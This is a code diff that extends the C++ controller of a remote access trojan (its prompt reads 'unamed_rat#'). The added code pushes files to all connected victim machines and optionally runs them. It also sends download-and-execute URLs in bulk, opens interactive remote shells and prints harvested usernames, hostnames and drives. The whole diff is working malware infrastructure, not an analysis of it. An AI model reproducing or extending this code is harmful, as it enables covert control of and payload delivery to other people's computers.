@@ -11,9 +11,11 @@ void Server::mtxUnlock(){
 }
 
 void Server::FreeClient(int iClientID){
-	delete Clients[iClientID];
-	Clients[iClientID] = nullptr;
-	std::cout<<"memory released\n";
+	if(Clients[iClientID] != nullptr){
+		delete Clients[iClientID];
+		Clients[iClientID] = nullptr;
+		std::cout<<"memory released\n";
+	}
 }
 
 void Server::FreeAllClients(){
@@ -23,7 +25,7 @@ void Server::FreeAllClients(){
 	}
 }
 
-bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID) {
+bool Server::SendFile(const std::string strRemoteFile, const std::string strLocalFile, int iClientID, char cRun) {
 	std::cout<<"Sending "<<strLocalFile<<'\n';
 	std::ifstream strmInputFile(strLocalFile, std::ios::binary);
 	if(!strmInputFile.is_open()){
@@ -41,6 +43,8 @@ bool Server::SendFile(const std::string strRemoteFile, const std::string strLoca
 	}
 	std::string strCmdLine = CommandCodes::cUpload;
 	strCmdLine.append(std::to_string(uFileSize));
+	strCmdLine.append(2, ':');
+	strCmdLine.append(1, cRun);
 	strCmdLine.append(2, ':');
 	strCmdLine.append(strRemoteFile);
 	if(ssSendBinary(Clients[iClientID]->sckSocket, strCmdLine.c_str(), strCmdLine.length()) > 0){
@@ -176,18 +180,25 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 						//receive confirmation that program is spawned
 						char *cConfirm = nullptr;
 						if(ssRecvBinary(Clients[iClientID]->sckSocket, cConfirm, 4) > 0){
-								if(strcmp(cConfirm, "1@1") == 0){
-									//spawn thread to receive output from shell
-									//spawn here
+								//if(strcmp(cConfirm, "1@1") == 0){							--  uncomment this to test with client
+									//spawn thread to receive output from shell             --     ""      ""  ""  ""   ""   ""
 									isReadingShell = true;
+									std::thread thCmd(&Server::threadRemoteCmdOutput, this, iClientID);
 									while(isReadingShell){
 										std::string strShellInput = "";
 										std::getline(std::cin, strShellInput);
+										if(Clients[iClientID] == nullptr){
+											break;
+										}
+										if(strShellInput.length() == 0){
+											continue;
+										}
 										ssSendBinary(Clients[iClientID]->sckSocket, strShellInput.c_str(), strShellInput.length());
 									}
-								} else {
-									std::cout<<"Shell not spawned\n";
-								}
+									thCmd.join();
+								//} else {													--  uncomment this to test with client
+								//	std::cout<<"Shell not spawned\n";						--    ""       ""  ""  ""   ""   ""
+								//}															--    ""       ""  ""  ""   ""   ""
 						} else {
 							std::cout<<"Unable to read response from client\n";
 						}
@@ -214,8 +225,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					char *cBufferInfo = nullptr;
 					if(ssSendBinary(Clients[iClientID]->sckSocket, CommandCodes::cReqBasicInfo, Misc::StrLen(CommandCodes::cReqBasicInfo)) > 0){
 						if(ssRecvBinary(Clients[iClientID]->sckSocket, cBufferInfo, 1024) > 0){
-							//here parse info depending os linux/windows
-							//Clients[iClientID]->strOS == "Linux" ? parseinfolinux : parseinfowindows''
+							ParseBasicInfo(cBufferInfo, Clients[iClientID]->strOS == "Windows" ? 1 : 0);
 						} else {
 							std::cout<<"Unable to retrieve information from client\n";
 							error();
@@ -283,7 +293,7 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 					}
 				}
 				if(strRemoteFile != "" && strLocalFile != ""){
-					SendFile(strRemoteFile, strLocalFile, iClientID); //check return boolean
+					SendFile(strRemoteFile, strLocalFile, iClientID, '0'); //check return boolean
 				} else {
 					std::cout<<"Invalid filenames\n";
 				}
@@ -332,7 +342,173 @@ void Server::ParseClientCommand(std::string strCommand, int iClientID){
 void Server::ParseMassiveCommand(std::string strCommand){
 	std::vector<std::string> vcMassiveCommands;
 	Misc::strSplit(strCommand, ' ', vcMassiveCommands, 10);
-	//process commands
+	if(vcMassiveCommands[0][0] == '!'){
+		std::string strTmp = vcMassiveCommands[0].substr(1, vcMassiveCommands[0].size() -1);
+		for(u_int iIt2 = 1; iIt2<vcMassiveCommands.size(); iIt2++){
+			strTmp.append(1, ' ');
+			strTmp.append(vcMassiveCommands[iIt2]);
+		}
+		system(strTmp.c_str());
+		return;
+	}
+	//upload httpd 
+	if(vcMassiveCommands.size() > 0){
+		if(vcMassiveCommands[0] == "upload"){
+			if(vcMassiveCommands.size() == 7){
+				std::string strLocalFile = "";
+				std::string strOS = "";
+				u_char cExec = '0'; //default if by any reason loop f***k it
+				for(u_int iIt=1; iIt<7; iIt+=2){
+					if(vcMassiveCommands[iIt] == "-f"){
+						strLocalFile = vcMassiveCommands[iIt+1];
+						continue;
+					}
+					if(vcMassiveCommands[iIt] == "-r"){
+						cExec = vcMassiveCommands[iIt+1] == "yes" ? '1' : '0';
+						continue;
+					}
+					if(vcMassiveCommands[iIt] == "-o"){
+						std::string strTmp = vcMassiveCommands[iIt+1];
+						Misc::strToLower(strTmp);
+						if(strTmp == "windows"){
+							strOS = "Windows";
+						} else if(strTmp == "linux"){
+							strOS = "Linux";
+						} else if(strTmp == "*") {
+							strOS = "all";
+						}
+					}
+				}
+				if(strLocalFile.length() > 0 && strOS != ""){
+					if(iClientsOnline > 0){
+						std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
+						std::string strRemoteFile = "";
+						char cBufferTmp[261];
+						strncpy(cBufferTmp, strLocalFile.c_str(), 260);
+						char *tkToken = strtok(cBufferTmp, "/");
+						while(tkToken != nullptr){
+							strRemoteFile = tkToken;
+							tkToken = strtok(nullptr, "/");
+						}
+						for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
+							if(Clients[iIt2] != nullptr){
+								if(Clients[iIt2]->strOS == strOS || strOS == "all"){
+									mtxLock();
+									Clients[iIt2]->isFlag = true;
+									mtxUnlock();
+									if(SendFile(strRemoteFile, strLocalFile, iIt2, cExec)){
+										std::cout<<"Client ["<<iIt2<<"] success\n";
+									} else {
+										std::cout<<"Client ["<<iIt2<<"] fail\n";
+										//error();
+									}
+									mtxLock();
+									Clients[iIt2]->isFlag = false;
+									mtxUnlock();
+								}
+							}
+						}
+					} else {
+						std::cout<<"No clients online\n";
+					}
+				} else {
+					std::cout<<"Error parsing arguments\n";
+				}
+			} else {
+				std::cout<<"\n\tUse upload -f local_filename -r yes|no -o windows|linux|*\n";
+			}
+			return;
+		}
+		if(vcMassiveCommands[0] == "httpd"){
+			if(vcMassiveCommands.size() == 7){
+				std::string strOS = "";
+				std::string strUrl = "";
+				std::string strCommandLine = "";
+				u_char cExec = '0';   //default if loop... you know
+				for(u_int iIt2=1; iIt2<7; iIt2+=2){
+					if(vcMassiveCommands[iIt2] == "-u"){
+						strUrl = vcMassiveCommands[iIt2+1];
+						continue;
+					}
+					if(vcMassiveCommands[iIt2] == "-r"){
+						cExec = vcMassiveCommands[iIt2+1] == "yes" ? '1' : '0';
+						continue;
+					}
+					if(vcMassiveCommands[iIt2] == "-o"){
+						std::string strTmp = vcMassiveCommands[iIt2+1];
+						Misc::strToLower(strTmp);
+						if(strTmp == "windows"){
+							strOS = "Windows";
+						} else if(strTmp == "linux"){
+							strOS == "Linux";
+						} else if(strTmp == "*"){
+							strOS == "all";
+						}
+					}
+				}
+					if(strUrl.length() > 0 && strOS != ""){
+						if(iClientsOnline > 0){
+							std::cout<<"Sending command to "<<iClientsOnline<<" clients\n";
+							std::string strCmdLine = CommandCodes::cHttpd;
+							strCmdLine.append(1, cExec);
+							strCmdLine.append(2, ':');
+							strCmdLine.append(strUrl);
+							for(u_int iIt2=0; iIt2<Max_Clients; iIt2++){
+								if(Clients[iIt2] != nullptr){
+									if(Clients[iIt2]->strOS == strOS || strOS == "all"){
+										mtxLock();
+										Clients[iIt2]->isFlag = true;
+										mtxUnlock();
+										if(ssSendBinary(Clients[iIt2]->sckSocket, strCmdLine.c_str(), strCmdLine.length()) > 0){
+											std::cout<<"Client ["<<iIt2<<"] success\n";
+										} else {
+											std::cout<<"Client ["<<iIt2<<"] fail\n";
+										}
+										mtxLock();
+										Clients[iIt2]->isFlag = true;
+										mtxUnlock();
+									}
+								}
+							}
+						} else {
+							std::cout<<"No clients online\n";
+						}
+					} else {
+						std::cout<<"Error parsing arguments\n";
+					}
+				} else {
+					std::cout<<"\n\tUse httpd -u http://url/to/file -r yes|no -o windows|linux|*\n";
+				}	
+			} 
+			return;
+		}
+}
+
+void Server::ParseBasicInfo(char*& cBuffer, int iOpt){
+	if(cBuffer != nullptr){
+		if(iOpt == 0){
+			std::vector<std::string> vcWinInfo;
+			std::vector<std::string> vcDrives;
+			Misc::strSplit(cBuffer, '@', vcWinInfo, 4);
+			if(vcWinInfo.size() == 4){
+				std::cout<<"\n\tUsername: "<<vcWinInfo[0]<<"\n\tOS: "<<vcWinInfo[1]<<"\n\tHostname: "<<vcWinInfo[2]<<"\n\tAvailable Drives: ";
+				Misc::strSplit(vcWinInfo[3], '#', vcDrives, 27);
+				if(vcDrives.size() > 0){
+					for(u_int iIt2=0; iIt2<vcDrives.size(); iIt2++){
+						std::cout<<" ["<<vcDrives[iIt2]<<"] ";
+					}
+					std::cout<<'\n';
+				} else {
+					std::cout<<"No hardrives retrieved!!! aaaaiiiuuudaaaaaa\n";
+				}
+			} else {
+				std::cout<<"No proccesable info heres raw\n"<<cBuffer<<'\n';
+			}
+		} else {
+			//by now jus t print out recived buffer
+			std::cout<<cBuffer<<'\n';
+		}
+	}	
 }
 
 int Server::ssSendStr(int sckSocket, const std::string& strMessage){
@@ -357,10 +533,10 @@ int Server::ssRecvStr(int sckSocket, std::string& strOutput, int sBytes){
 int Server::ssSendBinary(int sckSocket, const char *cData, int sBytes){
 	char *tmpData = nullptr;
 	txtCipher.BinaryCipher(cData, tmpData);
-	//int uiDataLen = Misc::StrLen(tmpData);
 	int iBytes = send(sckSocket, tmpData, sBytes, 0);
 	delete[] tmpData;
 	tmpData = nullptr;
+	std::cout<<"> "<<cData<<'\n';
 	return iBytes;
 }
 	
@@ -376,6 +552,7 @@ int Server::ssRecvBinary(int sckSocket, char*& cOutput, int sBytes){
 		cBuffer = nullptr;
 		return -1;
 	}
+	std::cout<<"< "<<cBuffer<<'\n';
 	cOutput = txtCipher.BinaryUnCipher((const char *)cBuffer);
 	delete[] cBuffer;
 	cBuffer = nullptr;
@@ -443,20 +620,20 @@ int Server::WaitConnection(char*& output){
 void Server::thStartHandler(){
 	isReceiveThread = true;
 	isCmdThread = true;
-	std::thread t1(threadListener, std::ref(*this));
-	std::thread t2(threadMasterCMD, std::ref(*this));
-	std::thread t3(threadClientPing, std::ref(*this));
+	std::thread t1(&Server::threadListener, this); //std::ref(*this));
+	std::thread t2(&Server::threadMasterCMD, this); //, std::ref(*this));
+	std::thread t3(&Server::threadClientPing, this); //, std::ref(*this));
 	t1.join();
 	t2.join();
 	t3.join();
 }
 
 //handle incomming connections
-void threadListener(Server& srvTMP){
+void Server::threadListener(){
 	//std::cout<<"Listener thread started\n";
 	int iClientCount = 0, uiOldValue = 0;
 	bool uiReachMax = false;
-	while(srvTMP.isReceiveThread){  //receiver loop
+	while(isReceiveThread){  //receiver loop
 		//if reach max connections loop until one disconects
 		usleep(100000); //prevent 100% cpu usage 100 miliseconds
 		if(iClientCount >= Max_Clients){
@@ -465,7 +642,7 @@ void threadListener(Server& srvTMP){
 			bool isAvailable = false;
 			int uiIt = 0;
 			for(; uiIt<Max_Clients; uiIt++){
-				if(srvTMP.Clients[uiIt] == nullptr){
+				if(Clients[uiIt] == nullptr){
 					//found a spot
 					iClientCount =  uiIt;
 					isAvailable = true;
@@ -475,45 +652,42 @@ void threadListener(Server& srvTMP){
 			if(!isAvailable){ continue; }
 		}
 		char *strTMPip = nullptr;
-		int sckTMP = srvTMP.WaitConnection(strTMPip);
+		int sckTMP = WaitConnection(strTMPip);
 		if(sckTMP != -1){
-			srvTMP.Clients[iClientCount] = new Client_Struct;
-			if(srvTMP.Clients[iClientCount] == nullptr){
+			Clients[iClientCount] = new Client_Struct;
+			if(Clients[iClientCount] == nullptr){
 				std::cout<<"Error allocating memory for new client\n";
 				error();
 				continue;
 			}
-			srvTMP.Clients[iClientCount]->sckSocket = dup(sckTMP);
+			Clients[iClientCount]->sckSocket = dup(sckTMP);
 			
 			//request os to client
-			//implement when client its created
-			/*int iBytes = srvTMP.ssSendBinary(srvTMP.Clients[iClientCount]->sckSocket, CommandCodes::cReqOS);
-			if(iBytes > 0){
+			if(ssSendBinary(Clients[iClientCount]->sckSocket, CommandCodes::cReqOS, Misc::StrLen(CommandCodes::cReqOS)) > 0){
 				char *strTmpBuffer = nullptr;
-				iBytes = srvTMP.ssRecvBinary(srvTMP.Clients[iClientCount]->sckSocket, strTmpBuffer, 2);
+				int iBytes = ssRecvBinary(Clients[iClientCount]->sckSocket, strTmpBuffer, 2);
 				if(iBytes > 0 && Misc::StrLen(strTmpBuffer) >  0){
-					srvTMP.Clients[iClientCount]->strOS = strTmpBuffer;
+					Clients[iClientCount]->strOS = strTmpBuffer[0] == '0' && strTmpBuffer[1] == '1' ? "Linux" : "Windows";
 				} else {
-					srvTMP.Clients[iClientCount]->strOS = "unkn0w";
+					Clients[iClientCount]->strOS = "unkn0w";
 				}
 				delete[] strTmpBuffer;
 				strTmpBuffer = nullptr;
-			}*/
-			srvTMP.Clients[iClientCount]->strOS = "unkn0w";
-
+			}
+			
 			//save obtained ip on client struct
 			if(strTMPip != nullptr){
-				srvTMP.Clients[iClientCount]->strIP = strTMPip;
+				Clients[iClientCount]->strIP = strTMPip;
 				delete[] strTMPip;
 				strTMPip = nullptr; 
 			}
 			
-			srvTMP.mtxLock();
-			srvTMP.Clients[iClientCount]->iID = iClientCount;
-			srvTMP.Clients[iClientCount]->isConnected = true;
-			srvTMP.Clients[iClientCount]->isFlag = false;
-			srvTMP.iClientsOnline++;
-			srvTMP.mtxUnlock();
+			mtxLock();
+			Clients[iClientCount]->iID = iClientCount;
+			Clients[iClientCount]->isConnected = true;
+			Clients[iClientCount]->isFlag = false;
+			iClientsOnline++;
+			mtxUnlock();
 			
 			if(uiReachMax){
 				iClientCount = uiOldValue;
@@ -529,11 +703,10 @@ void threadListener(Server& srvTMP){
 		}
 		
 	}
-	std::cout<<"end thread listener\n";
 }
 
 //here parse all commands from stdin
-void threadMasterCMD(Server& srvTMP){
+void Server::threadMasterCMD(){
 	std::string strPrompt = "unamed_rat# ";
 	while(1){
 		std::string strCMD;
@@ -558,20 +731,26 @@ void threadMasterCMD(Server& srvTMP){
 						strAction = vcCommands[iIt2+1];
 					}
 				}
-				if(srvTMP.Clients[iClientId] != nullptr && srvTMP.Clients[iClientId]->isConnected){
+				if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
 					if(strAction == "interact"){
 						//spawn prompt to interact with specified client
 						std::string strClientCmd = "";
-						std::string strPrompt = std::to_string(srvTMP.Clients[iClientId]->iID) + srvTMP.Clients[iClientId]->strIP + "@" + srvTMP.Clients[iClientId]->strOS + "#";
+						std::string strPrompt = "[" + std::to_string(Clients[iClientId]->iID) + " ]" + Clients[iClientId]->strIP + "@" + Clients[iClientId]->strOS + "#";
 						do{
 							std::cout<<strPrompt;
 							std::getline(std::cin, strClientCmd);
-							srvTMP.ParseClientCommand(strClientCmd, iClientId);
+							if(Clients[iClientId] == nullptr){
+								break;
+							}
+							if(strClientCmd.length() == 0){
+								continue;
+							}
+							ParseClientCommand(strClientCmd, iClientId);
 						}while(strClientCmd != "exit");
 					}else if(strAction == "close"){ //close client conenction
- 						if(srvTMP.Clients[iClientId] != nullptr && srvTMP.Clients[iClientId]->isConnected){
-							if((srvTMP.ssSendBinary(srvTMP.Clients[iClientId]->sckSocket,CommandCodes::cClose, Misc::StrLen(CommandCodes::cClose))) > 0){
-								close(srvTMP.Clients[iClientId]->sckSocket);
+ 						if(Clients[iClientId] != nullptr && Clients[iClientId]->isConnected){
+							if((ssSendBinary(Clients[iClientId]->sckSocket,CommandCodes::cClose, Misc::StrLen(CommandCodes::cClose))) > 0){
+								close(Clients[iClientId]->sckSocket);
 							} else {
 								std::cout<<"Unable to send close command\n";
 								error();
@@ -589,9 +768,12 @@ void threadMasterCMD(Server& srvTMP){
 				if(vcCommands[1] == "-c" && vcCommands[2] == "*"){
 					std::string strMassiveCmd = "";
 					do{
-						std::cout<<"[ "<<srvTMP.iClientsOnline<<" ] online# ";
+						std::cout<<"[ "<<iClientsOnline<<" ] online# ";
 						std::getline(std::cin, strMassiveCmd);
-						srvTMP.ParseMassiveCommand(strMassiveCmd);
+						if(strMassiveCmd.length() == 0){
+							continue;
+						}
+						ParseMassiveCommand(strMassiveCmd);
 					}while(strMassiveCmd != "exit");
 				}
 				continue;
@@ -599,15 +781,15 @@ void threadMasterCMD(Server& srvTMP){
 			if(vcCommands.size() == 2){ //cli -l
 				if(vcCommands[1] == "-l"){
 					//list connected clients
-					if(srvTMP.iClientsOnline <= 0){
+					if(iClientsOnline <= 0){
 						std::cout<<"\n\tNo clients online\n";
 						continue;
 					}
 					std::cout<<"\tClients online\n";
 					for(u_int iIt2 = 0; iIt2<Max_Clients; iIt2++){
-						if(srvTMP.Clients[iIt2] != nullptr){
-							if(srvTMP.Clients[iIt2]->isConnected){
-								std::cout<<"\t["<<srvTMP.Clients[iIt2]->iID<<"] "<<srvTMP.Clients[iIt2]->strIP<<" "<<srvTMP.Clients[iIt2]->strOS<<"\n";
+						if(Clients[iIt2] != nullptr){
+							if(Clients[iIt2]->isConnected){
+								std::cout<<"\t["<<Clients[iIt2]->iID<<"] "<<Clients[iIt2]->strIP<<" "<<Clients[iIt2]->strOS<<"\n";
 							}
 						}
 					}
@@ -635,36 +817,61 @@ void threadMasterCMD(Server& srvTMP){
 			break;
 		}
 	}
-	//lock method
-	srvTMP.isReceiveThread = false;
-	srvTMP.isCmdThread = false;
-	srvTMP.FreeAllClients();
-	//unlock method
+	mtxLock();
+	isReceiveThread = false;
+	isCmdThread = false;
+	FreeAllClients();
+	mtxUnlock();
 }
 
-void threadClientPing(Server& srvTMP){
+void Server::threadClientPing(){
 	//std::cout<<"Statrted ping\n";
-	while(srvTMP.isCmdThread){
-		usleep(100000); //prevent 100% cpu usage  100 miliseconds
+	
+	while(isCmdThread){
 		for(int iClientID = 0; iClientID<Max_Clients; iClientID++){
-			if(srvTMP.Clients[iClientID] != nullptr && srvTMP.Clients[iClientID]->isConnected){
-				if(srvTMP.Clients[iClientID]->isFlag){
+			if(Clients[iClientID] != nullptr && Clients[iClientID]->isConnected){
+				if(Clients[iClientID]->isFlag){
 					sleep(2);
 					continue;
 				} else {
-					int iBytes = send(srvTMP.Clients[iClientID]->sckSocket, "", 1, 0);
+					int iBytes = send(Clients[iClientID]->sckSocket, "", 1, 0);
 					if(iBytes != 1){
-						std::cout<<"Client["<<srvTMP.Clients[iClientID]->iID<<"] "<<srvTMP.Clients[iClientID]->strIP<<" disconnected\n";
-						srvTMP.mtxLock();
-						srvTMP.Clients[iClientID]->isConnected = false;
-						srvTMP.iClientsOnline--;
-						srvTMP.FreeClient(iClientID);
-						srvTMP.mtxUnlock();
+						std::cout<<"Client["<<Clients[iClientID]->iID<<"] "<<Clients[iClientID]->strIP<<" disconnected\n";
+						mtxLock();
+						Clients[iClientID]->isConnected = false;
+						iClientsOnline--;
+						FreeClient(iClientID);
+						mtxUnlock();
 					}
-					sleep(5);
 				}
 			}
+			usleep(100000); //prevent 100% cpu usage  100 miliseconds
 		}
+		sleep(3);
+	}
+}
+
+void Server::threadRemoteCmdOutput(int iClientID){
+	if(Clients[iClientID] != nullptr){
+		char *cCmdBuffer = nullptr;
+		int iBytes = 0;
+		while(isReadingShell){
+			iBytes = ssRecvBinary(Clients[iClientID]->sckSocket, cCmdBuffer, 1024);
+			if(iBytes > 0){
+				if(Misc::StrLen(cCmdBuffer) == 2 && cCmdBuffer[0] == '#' && cCmdBuffer[1] == 'p'){
+					//end reading remote output
+					break;
+				}
+				std::cout<<cCmdBuffer;
+				delete[] cCmdBuffer;
+			}
+		}
+		if(cCmdBuffer != nullptr){
+			delete[] cCmdBuffer;
+			cCmdBuffer = nullptr;
+		}
+	} else {
+		std::cout<<"thread not spawned client doesnt exist or is not connected\n";
 	}
 }
 
